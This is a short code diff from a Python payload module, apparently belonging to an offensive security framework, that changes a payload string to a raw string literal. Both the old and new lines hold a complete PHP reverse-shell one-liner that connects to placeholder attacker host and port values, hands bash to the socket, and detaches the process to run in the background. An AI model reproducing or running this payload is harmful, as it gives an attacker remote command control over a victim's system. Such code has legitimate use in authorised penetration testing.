@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' > /dev/null 2>&1 & disown"
+    data = r"nohup php -r '$sock=fsockopen(\"*LHOST*\",*LPORT*);$proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' > /dev/null 2>&1 & disown"
